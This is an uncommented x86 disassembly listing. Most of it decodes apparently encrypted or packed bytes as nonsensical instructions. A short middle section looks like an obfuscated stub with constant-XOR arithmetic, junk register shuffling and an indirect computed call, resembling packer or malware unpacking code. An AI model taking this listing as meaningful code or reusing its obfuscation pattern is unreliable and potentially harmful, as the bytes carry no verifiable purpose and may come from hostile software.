  408a76:	xchg   cl,dh
  408a78:	mov    ds:0x829acd56,eax
  408a7d:	in     al,0xd8
  408a7f:	outs   dx,DWORD PTR ds:[esi]
  408a80:	push   ebx
  408a81:	jb     0x408a24
  408a83:	push   esi
  408a84:	jmp    DWORD PTR [edx]
  408a86:	pop    ecx
  408a87:	aaa    
  408a88:	jge    0x408a6b
  408a8a:	inc    eax
  408a8b:	mov    eax,0xee365092
  408a90:	jl     0x408a47
  408a92:	rcr    DWORD PTR [edi],0x8a
  408a95:	out    dx,al
  408a96:	mov    al,0x3d
  408a98:	pop    ebp
  408a99:	rcr    BYTE PTR [esi-0x68c7ec9f],1
  408a9f:	mov    edx,0xfebd8719
  408aa4:	call   0x2b20293c
  408aa9:	std    
  408aaa:	loopne 0x408a94
  408aac:	jmp    0x408a56
  408aae:	int3   
  408aaf:	jmp    0xef2a2190
  408ab4:	add    DWORD PTR [esi+0x1aa8d93b],ebx
  408aba:	pop    edi
  408abb:	dec    ebp
  408abc:	rol    DWORD PTR [ecx*2+0x5046187d],cl
  408ac3:	leave  
  408ac4:	mov    esi,0xe60ebe34
  408ac9:	std    
  408aca:	daa    
  408acb:	rol    BYTE PTR [edx],1
  408acd:	je     0x408b25
  408acf:	xlat   BYTE PTR ds:[ebx]
  408ad0:	add    edi,DWORD PTR ds:0x2647c19
  408ad6:	mov    dh,bl
  408ad8:	jnp    0x408b34
  408ada:	dec    ebx
  408adb:	adc    ebx,DWORD PTR [eax]
  408add:	shl    DWORD PTR [ebx+0x483f08cc],1
  408ae3:	or     al,0x35
  408ae5:	test   eax,0x17ec6a08
  408aea:	(bad)  
  408aeb:	dec    eax
  408aec:	adc    ebp,edi
  408aee:	inc    edi
  408aef:	pop    ebp
  408af0:	or     BYTE PTR ds:0xe0c70cbc,dh
  408af6:	sub    DWORD PTR [ebp-0x453577fd],ecx
  408afc:	push   eax
  408afd:	mov    ah,0x1
  408aff:	xor    al,BYTE PTR [ecx]
  408b01:	pop    ebp
  408b02:	pop    ecx
  408b03:	mov    al,0x17
  408b05:	push   eax
  408b06:	pop    edi
  408b07:	aas    
  408b08:	xchg   BYTE PTR [esi+0x751e6baf],dl
  408b0e:	sub    BYTE PTR [ecx],dl
  408b10:	rcr    DWORD PTR [ebx-0x3],1
  408b13:	add    eax,0x122194e3
  408b18:	lea    edi,[ebx-0x49]
  408b1b:	into   
  408b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1d:	shl    BYTE PTR [ebx+0x1e0403cf],1
  408b23:	(bad)  
  408b24:	push   ds
  408b25:	stos   BYTE PTR es:[edi],al
  408b26:	add    dh,dl
  408b28:	xchg   esi,eax
  408b29:	pusha  
  408b2a:	lods   al,BYTE PTR ds:[esi]
  408b2b:	aad    0xd4
  408b2d:	inc    edx
  408b2e:	xor    ah,BYTE PTR [eax]
  408b30:	daa    
  408b31:	adc    BYTE PTR [ecx+eax*1+0xf738b32],bh
  408b38:	test   BYTE PTR [eax-0x7a],bl
  408b3b:	dec    ebp
  408b3c:	xchg   BYTE PTR [eax],ch
  408b3e:	push   eax
  408b3f:	leave  
  408b40:	push   ds
  408b41:	outs   dx,BYTE PTR ds:[esi]
  408b42:	cmp    dl,BYTE PTR [eax]
  408b44:	addr16 iret 
  408b46:	fs stos BYTE PTR es:[edi],al
  408b48:	mov    edi,0x831b7521
  408b4d:	adc    DWORD PTR [ecx+0x1b],edi
  408b50:	stos   DWORD PTR es:[edi],eax
  408b51:	clc    
  408b52:	dec    eax
  408b53:	inc    ebp
  408b54:	mov    ah,0x8a
  408b56:	xor    DWORD PTR [edx-0x1bf6a599],esi
  408b5c:	sar    DWORD PTR [eax-0x75],0x13
  408b60:	aam    0x50
  408b62:	outs   dx,BYTE PTR ds:[esi]
  408b63:	mov    ebx,0x7c8fbe26
  408b68:	or     BYTE PTR [edi+0x45],ah
  408b6b:	test   eax,0x903902f7
  408b70:	scas   al,BYTE PTR es:[edi]
  408b71:	add    al,0xe8
  408b73:	or     esp,edx
  408b75:	sub    DWORD PTR [edi-0x408130e7],eax
  408b7b:	cwde   
  408b7c:	jb     0x408b6e
  408b7e:	sub    BYTE PTR [edx+0x34e2a9a5],al
  408b84:	enter  0xe636,0xf4
  408b88:	iret   
  408b89:	shl    DWORD PTR [edx+eiz*8+0x7ceb54ac],cl
  408b90:	jmp    0x408c00
  408b92:	inc    esp
  408b93:	pushf  
  408b94:	in     eax,0x9a
  408b96:	lods   al,BYTE PTR ds:[esi]
  408b97:	mov    dl,0xf7
  408b99:	mov    eax,0xe5136b8f
  408b9e:	inc    ebx
  408b9f:	jmp    0x59bb7d19
  408ba4:	pop    ss
  408ba5:	xor    DWORD PTR [ebp-0x767d0788],ebp
  408bab:	jno    0x408be8
  408bad:	or     DWORD PTR [eax+0x7550021d],ebx
  408bb3:	inc    edx
  408bb4:	xchg   esi,eax
  408bb5:	jne    0x408bfe
  408bb7:	(bad)  
  408bb8:	pop    ecx
  408bb9:	mov    ecx,0x8431a70e
  408bbe:	xor    ecx,DWORD PTR [esi+esi*1-0x10ab7755]
  408bc5:	xor    DWORD PTR [eax-0x37],edi
  408bc8:	lods   al,BYTE PTR ds:[esi]
  408bc9:	push   es
  408bca:	fsubr  DWORD PTR [edi+esi*8]
  408bcd:	mov    dl,BYTE PTR [edi]
  408bcf:	cmc    
  408bd0:	jbe    0x408c11
  408bd2:	mov    edx,0x515d6e46
  408bd7:	xchg   ebx,eax
  408bd8:	mov    fs,WORD PTR [edi+ebp*2]
  408bdb:	addr16 fdivr st,st(1)
  408bde:	push   0x53aeddb4
  408be3:	daa    
  408be4:	inc    ecx
  408be5:	rol    DWORD PTR [eax+edi*8+0x5f9cb632],1
  408bec:	scas   eax,DWORD PTR es:[edi]
  408bed:	loope  0x408c1c
  408bef:	mov    edx,0xf2dbd27a
  408bf4:	dec    esp
  408bf5:	(bad)  
  408bf6:	jmp    0x408b94
  408bf8:	data16 sbb BYTE PTR [edi+esi*2],ah
  408bfc:	xchg   ebp,eax
  408bfd:	add    DWORD PTR [edx-0x32],edx
  408c00:	cmp    BYTE PTR [esi],cl
  408c02:	jmp    0x9f7066bb
  408c07:	adc    DWORD PTR [ebp+0x301a216c],esp
  408c0d:	pop    edi
  408c0e:	gs dec edx
  408c10:	xor    esp,ecx
  408c12:	inc    esi
  408c13:	add    BYTE PTR [edi],0x75
  408c16:	pusha  
  408c17:	jp     0x408c96
  408c19:	ins    BYTE PTR es:[edi],dx
  408c1a:	loop   0x408c87
  408c1c:	add    al,cl
  408c1e:	in     eax,dx
  408c1f:	lods   eax,DWORD PTR ds:[esi]
  408c20:	call   0xdc38:0x108f5b56
  408c27:	pop    edi
  408c28:	imul   esi,edi,0x4d0ba1a
  408c2e:	enter  0x7e6b,0x62
  408c32:	and    BYTE PTR [edx-0x11],cl
  408c35:	pushf  
  408c36:	mov    ebp,0x5a1fe9c8
  408c3b:	lds    edx,FWORD PTR [esi-0x67]
  408c3e:	out    dx,al
  408c3f:	cmp    DWORD PTR [edi],ebx
  408c41:	mov    ebx,DWORD PTR [eax+0x4b]
  408c44:	out    0xc2,eax
  408c46:	ins    BYTE PTR es:[edi],dx
  408c47:	ja     0x408ca2
  408c49:	or     eax,0x1d2ef838
  408c4e:	jmp    0x4d339e51
  408c53:	fsubr  DWORD PTR [esi+0x60]
  408c56:	das    
  408c57:	(bad)  
  408c58:	pop    edi
  408c59:	add    DWORD PTR [esi+0xe],eax
  408c5c:	and    DWORD PTR [ecx-0xc],esp
  408c5f:	into   
  408c60:	gs jb  0x408c93
  408c63:	out    dx,eax
  408c64:	inc    eax
  408c65:	(bad)  
  408c66:	adc    ax,0x9285
  408c6a:	test   BYTE PTR [ecx-0x32b5af28],dl
  408c70:	mov    DWORD PTR ds:0xfa0020d2,edi
  408c76:	jb     0x408cde
  408c78:	dec    esp
  408c79:	nop
  408c7a:	(bad)  
  408c7b:	adc    BYTE PTR [esi],ch
  408c7d:	push   ecx
  408c7e:	xor    eax,0x20464611
  408c83:	sbb    DWORD PTR [eax],edi
  408c85:	cmp    esp,esi
  408c87:	push   ds
  408c88:	in     al,0x96
  408c8a:	hlt    
  408c8b:	icebp  
  408c8c:	lock fs jmp 0x440b:0x2072f26c
  408c95:	jae    0x408d01
  408c97:	test   BYTE PTR [eax],dh
  408c99:	sub    al,0x3c
  408c9b:	pop    es
  408c9c:	into   
  408c9d:	or     dh,al
  408c9f:	retf   
  408ca0:	xor    al,0x2a
  408ca2:	adc    eax,0x5677b89c
  408ca7:	jno    0x408cf8
  408ca9:	pop    esi
  408caa:	fiadd  DWORD PTR [edx+edi*1]
  408cad:	int3   
  408cae:	arpl   WORD PTR [edi+edx*8+0x10],bp
  408cb2:	aam    0x34
  408cb4:	pavgb  mm6,mm4
  408cb7:	fdiv   QWORD PTR [eax-0x601176b9]
  408cbd:	push   ecx
  408cbe:	aad    0x72
  408cc0:	ror    BYTE PTR [ecx-0x6f],0xd2
  408cc4:	or     DWORD PTR [esi],0xffffff9c
  408cc7:	ret    
  408cc8:	dec    edi
  408cc9:	pop    edi
  408cca:	sub    eax,0xa72adc36
  408ccf:	aas    
  408cd0:	mov    DWORD PTR [eax-0xd46a24d],eax
  408cd6:	popf   
  408cd7:	mov    cl,0xbf
  408cd9:	mov    edx,0xe382bae1
  408cde:	add    dl,BYTE PTR [ebx]
  408ce0:	jmp    0x69b1:0xd99d6934
  408ce7:	scas   al,BYTE PTR es:[edi]
  408ce8:	sub    BYTE PTR [esi+eiz*2-0x2a32371c],dl
  408cef:	xchg   ebp,eax
  408cf0:	(bad)
  408cf4:	cmc    
  408cf5:	push   edx
  408cf6:	out    dx,eax
  408cf7:	daa    
  408cf8:	add    eax,0x870929a4
  408cfd:	jp     0x408d3c
  408cff:	dec    esp
  408d00:	mov    bh,0x11
  408d02:	mov    bl,0xf8
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x103327cf
  408e55:	ds stos DWORD PTR es:[edi],eax
  408e57:	push   ebx
  408e58:	mov    bl,BYTE PTR [ecx]
  408e5a:	bound  esp,QWORD PTR [edx+0x2b]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx-0x23]
  408e61:	xor    al,0xe9
  408e63:	in     eax,0xcb
  408e65:	out    dx,eax
  408e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e67:	pop    ss
  408e68:	jmp    0xacda9989
  408e6d:	dec    ebx
  408e6e:	frstor [esi]
  408e70:	hlt    
  408e71:	dec    edx
  408e72:	int    0x83
  408e74:	pusha  
  408e75:	dec    esp
  408e76:	cs jg  0x408ef2
  408e79:	inc    esp
  408e7a:	clc    
  408e7b:	jmp    0x8515:0xbeb623ea
  408e82:	test   eax,0x4097e976
  408e87:	clc    
  408e88:	mov    ds:0x3fc06da3,al
  408e8d:	fwait
  408e8e:	pop    ecx
  408e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e90:	sbb    bh,bl
  408e92:	out    dx,eax
  408e93:	cdq    
  408e94:	int    0x30
  408e96:	lods   eax,DWORD PTR ds:[esi]
  408e97:	gs ret 0x8fb3
  408e9b:	in     al,0x99
  408e9d:	fild   WORD PTR [ebp+edi*4-0x1d]
  408ea1:	in     al,dx
  408ea2:	xchg   esp,eax
  408ea3:	popa   
  408ea4:	test   al,0xea
  408ea6:	aaa    
  408ea7:	fisubr WORD PTR [ecx]
  408ea9:	sub    eax,0x71b7b14c
  408eae:	ret    
  408eaf:	jecxz  0x408f0b
  408eb1:	sbb    BYTE PTR [eax-0x2d367ab9],ch
  408eb7:	jmp    0x408e7e
  408eb9:	xchg   esp,eax
  408eba:	sub    al,0x3c
  408ebc:	sub    DWORD PTR [edi+0x705447ef],edx
  408ec2:	mov    bl,0xdb
  408ec4:	retf   
  408ec5:	enter  0x6601,0x90
  408ec9:	rcr    BYTE PTR [ebp+0x77],1
  408ecc:	add    eax,0x68da90ea
  408ed1:	mov    BYTE PTR [ebp-0x2d1ecb6a],dh
  408ed7:	mov    bl,BYTE PTR [eax]
  408ed9:	in     eax,0xe2
  408edb:	lds    eax,FWORD PTR [ebp-0x4a]
  408ede:	fmul   DWORD PTR [edi+0xda0b5a4]
  408ee4:	dec    ecx
  408ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ee6:	push   ds
  408ee7:	sbb    esi,ebp
  408ee9:	jbe    0x408eac
  408eeb:	adc    BYTE PTR [eax+0x48f5c8e0],ah
  408ef1:	mov    DWORD PTR [ebx-0x58],edx
  408ef4:	adc    al,0x8c
  408ef6:	es jle 0x408e98
  408ef9:	mov    ds:0x2d12a755,eax
  408efe:	loope  0x408eae
  408f00:	jmp    0xe59d:0x2c6a6345
  408f07:	int    0xa7
  408f09:	gs push cs
  408f0b:	and    esp,DWORD PTR [ebp-0x7a]
  408f0e:	out    dx,eax
  408f0f:	imul   ebx,DWORD PTR [edi],0xffffffcc
  408f12:	clc    
  408f13:	sahf   
  408f14:	or     eax,0x5b183128
  408f19:	sbb    DWORD PTR [ecx+0x76],ecx
  408f1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1d:	outs   dx,BYTE PTR ds:[esi]
  408f1e:	jmp    0x408f27
  408f20:	imul   esi,DWORD PTR [edx-0x5],0xa0fe0d80
  408f27:	mov    gs,esi
  408f29:	xchg   al,dh
  408f2b:	push   ebp
  408f2c:	shr    DWORD PTR [ecx+0x9],1
  408f2f:	sbb    al,0x1c
  408f31:	int    0xdf
  408f33:	jae    0x408f84
  408f35:	loop   0x408f4f
  408f37:	repz push esp
  408f39:	gs ja  0x408fb7
  408f3c:	adc    edx,DWORD PTR [edx-0x528d9602]
  408f42:	jmp    0x8b83:0x36e21cb
  408f49:	mov    bh,0xf0
  408f4b:	adc    edx,DWORD PTR [ebp-0x688d8a1e]
  408f51:	ror    DWORD PTR [eax+0x22b0d8d8],0xcf
  408f58:	jecxz  0x408fd3
  408f5a:	aaa    
  408f5b:	scas   eax,DWORD PTR es:[edi]
  408f5c:	mov    ah,0xaa
  408f5e:	aam    0x15
  408f60:	cdq    
  408f61:	rcl    dh,cl
  408f63:	dec    edx
  408f64:	inc    edi
  408f65:	xchg   DWORD PTR [eax],esi
  408f67:	pop    edx
  408f68:	std    
  408f69:	mov    ds:0xdb7bc41e,al
  408f6e:	xchg   esi,eax
  408f6f:	loope  0x408fea
  408f71:	mov    cl,0xa0
  408f73:	mov    ch,0xba
  408f75:	das    
  408f76:	and    BYTE PTR [edx],bl
  408f78:	fdivrp st(1),st
  408f7a:	mov    esp,0xae72994a
  408f7f:	(bad)  
  408f80:	aam    0x2e
  408f82:	hlt    
  408f83:	cmc    
  408f84:	adc    ebx,0xbfa8a430
  408f8a:	les    ecx,FWORD PTR [edi]
  408f8c:	stos   DWORD PTR es:[edi],eax
  408f8d:	jp     0x408f33
  408f8f:	(bad)  
  408f90:	mov    edi,0x194942cc
  408f95:	stc    
  408f96:	push   edi
  408f97:	mov    bh,0xff
  408f99:	scas   eax,DWORD PTR es:[edi]
  408f9a:	pop    ebp
  408f9b:	sub    al,0x24
  408f9d:	shr    eax,0xd8
  408fa0:	sbb    bh,BYTE PTR [eax+0x5a]
  408fa3:	inc    ecx
  408fa4:	xchg   cl,dl
  408fa6:	sbb    eax,0x30cbda47
  408fab:	jne    0x408ffc
  408fad:	sub    DWORD PTR [eax+0x70],ebp
  408fb0:	xor    BYTE PTR [ebp+0xb],cl
  408fb3:	xor    eax,0x1972643d
  408fb8:	pusha  
  408fb9:	into   
  408fba:	cmp    al,0x23
  408fbc:	cs mov ecx,0xa290ed6e
  408fc2:	add    BYTE PTR [edx],al
  408fc4:	gs cmp esi,ebp
  408fc7:	pop    eax
  408fc8:	fmul   DWORD PTR es:[ecx+ebp*4-0x2a]
  408fcd:	xor    DWORD PTR [ecx+0x45a32358],edi
  408fd3:	hlt    
  408fd4:	repnz in al,dx
  408fd6:	dec    ecx
  408fd7:	test   al,0x1a
  408fd9:	ret    0x84a3
  408fdc:	dec    edi
  408fdd:	push   edi
  408fde:	nop
  408fdf:	inc    ecx
  408fe0:	xor    ah,BYTE PTR [ecx+0x7]
  408fe3:	mov    edx,0xcb982c5
  408fe8:	jmp    0x408fc2
  408fea:	sub    BYTE PTR [ecx],ah
  408fec:	adc    eax,0xff2869c9
  408ff1:	mov    dh,0xe5
  408ff3:	xchg   ebp,eax
  408ff4:	sbb    al,0xf0
  408ff6:	rol    ch,cl
  408ff8:	in     al,dx
  408ff9:	fwait
  408ffa:	mov    esi,0x440d2cc1
  408fff:	mov    al,ds:0xd64d4937
  409004:	dec    eax
  409005:	add    al,0x8
  409007:	and    eax,0xf79d0fa6
  40900c:	outs   dx,DWORD PTR ds:[esi]
  40900d:	nop
  40900e:	stos   BYTE PTR es:[edi],al
  40900f:	ds dec esp
  409011:	(bad)  
  409012:	test   DWORD PTR [ebx-0x38a5644c],0x3367fee6
  40901c:	jnp    0x408ff3
  40901e:	jb     0x409065
  409020:	lea    esp,ds:0x4e4e317e
  409026:	ss ja  0x408fad
  409029:	fldcw  WORD PTR [ecx+edi*2-0x15]
  40902d:	jno    0x409099
  40902f:	ins    DWORD PTR es:[edi],dx
  409030:	ins    DWORD PTR es:[edi],dx
  409031:	sub    ebx,DWORD PTR [ebx]
  409033:	jle    0x40906a
  409035:	adc    DWORD PTR [eax-0x1dc10641],eax
  40903b:	scas   al,BYTE PTR es:[edi]
  40903c:	adc    BYTE PTR [esi],dh
  40903e:	mov    dl,0x4
  409040:	pop    esp
  409041:	and    DWORD PTR [edx+0x4b819b8b],edi
  409047:	sbb    BYTE PTR [ebx+0x4046d867],dh
  40904d:	(bad)  
  40904e:	mov    dh,0x36
  409050:	xor    eax,0x9013dd2a
  409055:	jb     0x409068
  409057:	mul    BYTE PTR ds:0x93500eb6
  40905d:	pop    es
  40905e:	bound  eax,QWORD PTR [eax]
  409060:	outs   dx,BYTE PTR ds:[esi]
  409061:	std    
  409062:	mov    eax,0xa4f2f6ca
  409067:	inc    eax
  409068:	dec    esi
  409069:	retf   
  40906a:	push   0x2f3dfebd
  40906f:	push   ss
  409070:	lds    ebx,FWORD PTR [eax]
  409072:	stc    
  409073:	and    esi,DWORD PTR [ebx]
  409075:	jmp    0xb92e2f61
  40907a:	fs into 
  40907c:	or     ebx,ecx
  40907e:	mov    WORD PTR [ebx],ds
  409080:	push   es
  409081:	jmp    0x40904a
  409083:	xor    esp,DWORD PTR [ebp+0x1518849c]
  409089:	ret    0xc6b9
  40908c:	pop    edi
  40908d:	or     bl,dh
  40908f:	mov    al,0x5f
  409091:	leave  
  409092:	dec    ecx
  409093:	xor    eax,0x549a34ec
  409098:	pop    esi
  409099:	pushf  
  40909a:	xor    BYTE PTR [edi-0x5e3c86ad],ah
  4090a0:	cs xchg ebx,eax
  4090a2:	bound  eax,QWORD PTR [ebp-0x60]
  4090a5:	jbe    0x409101
  4090a7:	ret    0xa1e6
  4090aa:	dec    ebp
  4090ab:	xchg   ebp,eax
  4090ac:	bound  ecx,QWORD PTR [edx]
  4090ae:	push   ds
  4090af:	push   eax
  4090b0:	and    BYTE PTR [ebp+edx*2-0x4b0de2be],dh
  4090b7:	mov    bl,0x7b
  4090b9:	dec    ebx
  4090ba:	adc    al,0x94
  4090bc:	or     al,0x9e
  4090be:	hlt    
  4090bf:	xor    eax,0x7431809c
  4090c4:	inc    esi
  4090c5:	mov    eax,ds:0x6201ff7c
  4090ca:	mov    eax,ds:0x2c7039b0
  4090cf:	inc    eax
  4090d0:	add    DWORD PTR [ebx],edi
  4090d2:	shl    BYTE PTR ds:0xe2aefaeb,0xda
  4090d9:	sbb    ah,BYTE PTR [ebx-0x11c9ec6e]
  4090df:	pushf  
  4090e0:	jne    0x409108
  4090e2:	jb     0x4090c2
  4090e4:	mov    bl,0xc6
  4090e6:	fisttp QWORD PTR [esi]
  4090e8:	stos   BYTE PTR es:[edi],al
  4090e9:	stos   BYTE PTR es:[edi],al
  4090ea:	es mov cl,0x2f
  4090ed:	rcr    DWORD PTR [ebx],1
  4090ef:	icebp  
  4090f0:	ficomp WORD PTR [ebx]
  4090f3:	push   esp
  4090f4:	xor    al,0xed
  4090f6:	test   al,0x99
  4090f8:	or     dh,bh
  4090fa:	push   ebx
  4090fb:	jno    0x409174
  4090fd:	inc    esp
  4090fe:	xchg   ecx,eax
  4090ff:	inc    edi
  409100:	call   0x6ad0:0x372852db
  409107:	and    al,dl
  409109:	cdq    
  40910a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40910b:	sub    al,0x76
  40910d:	pushf  
  40910e:	cli    
  40910f:	sub    DWORD PTR [ecx],edi
  409111:	inc    esi
  409112:	outs   dx,DWORD PTR ds:[esi]
  409113:	cmp    eax,0x9f85477e
  409118:	push   esp
  409119:	xor    al,0xeb
  40911b:	in     eax,dx
  40911c:	push   ds
  40911d:	inc    ebx
  40911e:	xchg   esp,eax
  40911f:	xchg   BYTE PTR [esi-0x6401b23d],bh
  409125:	dec    esp
  409126:	adc    al,0x2c
  409128:	out    0xfa,eax
  40912a:	pop    ebp
  40912b:	icebp  
  40912c:	mov    dl,0x8a
  40912e:	in     eax,dx
  40912f:	popf   
  409130:	cmp    al,BYTE PTR [esi-0x52]
  409133:	fidiv  DWORD PTR [ebx]
  409135:	xchg   ecx,eax
  409136:	(bad)  
  409137:	leave  
  409138:	ins    DWORD PTR es:[edi],dx
  409139:	mov    ecx,0x47b8a9d9
  40913e:	retf   0x7486
  409141:	(bad)  
  409143:	adc    al,0x43
  409145:	xor    DWORD PTR [edx+0x2a8eb93c],ecx
  40914b:	or     bh,ah
  40914d:	pop    esi
  40914e:	xor    DWORD PTR [ebx-0x244c028d],esp
  409154:	fcom   DWORD PTR [ebp+ecx*8-0x12]
  409158:	stos   DWORD PTR es:[edi],eax
  409159:	retf   
  40915a:	xchg   esi,eax
  40915b:	ins    BYTE PTR es:[edi],dx
  40915c:	stos   BYTE PTR es:[edi],al
  40915d:	in     al,dx
  40915e:	add    al,0xfb
  409160:	pop    es
  409161:	(bad)  
  409162:	js     0x409104
  409164:	mov    bh,0x17
  409167:	jecxz  0x40919d
  409169:	leave  
  40916a:	inc    esp
  40916b:	hlt    
  40916c:	sbb    BYTE PTR [esi],dh
  40916e:	(bad)  
  40916f:	in     eax,dx
  409170:	pop    ebp
  409171:	ss aam 0x31
  409174:	or     cl,ch
  409176:	mov    esp,0x1c14c379
  40917b:	test   DWORD PTR [esp+eax*1+0x32],eax
  40917f:	mov    ds:0xae617be,eax
  409184:	test   BYTE PTR [ecx+eiz*1],bh
  409187:	mov    cl,0x60
  409189:	mov    cl,0xb9
  40918b:	pop    ecx
  40918c:	out    dx,al
  40918d:	add    DWORD PTR [edx-0x48],ecx
  409190:	xchg   esp,esi
  409192:	ror    BYTE PTR [ebp-0x4d2e5e59],1
  409198:	pop    esp
  409199:	mov    dh,0xeb
  40919b:	xchg   BYTE PTR [edi+0x1d],bl
  40919e:	jo     0x409194
  4091a0:	jmp    0x93f8d575
  4091a5:	cwde   
  4091a6:	int    0x5f
  4091a8:	popf   
  4091a9:	mov    edx,0x33194eff
  4091ae:	xchg   edx,eax
  4091af:	and    BYTE PTR [eax],dh
  4091b1:	rcr    DWORD PTR gs:[edx],0x59
  4091b5:	cli    
  4091b6:	(bad)  
  4091b7:	pop    edx
  4091b8:	clts   
  4091ba:	cmp    al,0x77
  4091bc:	lock or DWORD PTR [eax-0x2ad038e0],eax
  4091c3:	add    BYTE PTR ds:0xf975251c,0x88
  4091ca:	or     al,0x52
  4091cc:	(bad)  
  4091cd:	enter  0xd2fd,0xaa
  4091d1:	mul    BYTE PTR [edx-0x59]
  4091d4:	icebp  
  4091d5:	repnz mov eax,0xba85a80d
  4091db:	xlat   BYTE PTR ds:[ebx]
  4091dc:	push   ds
  4091dd:	and    BYTE PTR [edx-0x2b],dh
  4091e0:	mov    ebx,ds
  4091e2:	div    DWORD PTR [ebx-0x69df4e65]
  4091e8:	mov    cl,0x4
  4091ea:	(bad)  [eax]
  4091ec:	out    0xc,al
  4091ee:	lock mov al,0x86
  4091f1:	mov    cl,0xa8
  4091f3:	ror    DWORD PTR [esi+0xdc9b113],1
  4091f9:	in     eax,dx
  4091fa:	push   ebx
  4091fb:	jmp    0xdbfc83b4
  409200:	add    edi,ebx
  409202:	adc    al,0x2a
  409204:	mov    al,ds:0x612c6de6
  409209:	test   DWORD PTR [eax+ecx*4],ebx
  40920c:	push   ds
  40920d:	jbe    0x409255
  40920f:	add    BYTE PTR [ebp-0x6a559f58],ch
  409215:	push   0x4e1cbdb8
  40921a:	sbb    esi,DWORD PTR [ecx+0x677f91e7]
  409220:	sbb    al,0xbe
  409222:	js     0x409212
  409224:	and    al,BYTE PTR [ebp+0x5293f0ab]
  40922a:	(bad)  
  40922b:	popf   
  40922c:	ds pop eax
  40922f:	mov    bh,0xc
  409231:	sub    DWORD PTR [ecx-0x57d17b13],edx
  409237:	cs pusha 
  409239:	inc    ecx
  40923a:	daa    
  40923b:	arpl   WORD PTR [ebx+eiz*1-0x120e5b1],bp
  409242:	(bad)
  409246:	fwait
  409247:	data16 sub al,0x6b
  40924a:	xor    edx,eax
  40924c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924d:	mov    cl,0xe8
  40924f:	dec    edi
  409250:	and    eax,0x3daf538c
  409255:	fst    st(1)
  409257:	mov    ah,0x80
  409259:	into   
  40925a:	and    al,0x38
  40925c:	pop    esi
  40925d:	mov    ah,0x2d
  40925f:	sbb    DWORD PTR [esi-0x4742bc8d],esp
